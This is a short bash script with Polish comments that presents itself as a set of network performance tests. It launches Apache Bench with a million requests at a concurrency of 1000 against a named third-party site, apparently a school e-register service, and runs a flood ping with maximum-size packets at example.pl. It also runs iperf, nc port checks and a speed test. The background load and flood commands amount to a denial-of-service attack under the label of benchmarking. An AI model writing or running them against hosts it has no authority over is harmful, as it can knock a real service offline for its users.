#!/bin/bash

# Funkcja do uruchamiania testu Apache Bench
run_ab_test() {
    ab -n 1000000 -c 1000 -g ab_results.csv https://zszkurzetnik.mobidziennik.pl/ &
}

# Funkcja do uruchamiania testu ping
run_ping_test() {
    ping -f -c 65507 -s 65507 -i 0.001 example.pl &
}

# Funkcja do monitorowania wydajności sieciowej
network_performance_monitor() {
    echo "Monitorowanie wydajności sieciowej:"
    echo "----------------------------------"
    iperf -c zszkurzetnik.mobidziennik.pl
}

# Funkcja do sprawdzania dostępności portów
check_port_availability() {
    echo "Sprawdzanie dostępności portów:"
    echo "-------------------------------"
    nc -zv example.pl 80
    nc -zv example.pl 443
}

# Funkcja do analizy logów
analyze_logs() {
    echo "Analiza logów:"
    echo "--------------"
    # Dodaj tutaj kod do analizy logów, generowania raportów itp.
}

# Funkcja do testowania prędkości łącza
speed_test() {
    echo "Testowanie prędkości łącza:"
    echo "---------------------------"
    speedtest-cli --server 1234
}

# Uruchomienie testu Apache Bench
run_ab_test

# Uruchomienie testu ping
run_ping_test

# Monitorowanie wydajności sieciowej
network_performance_monitor

# Sprawdzanie dostępności portów
check_port_availability

# Analiza logów
analyze_logs

# Testowanie prędkości łącza
speed_test

# Oczekiwanie na zakończenie wszystkich testów
wait
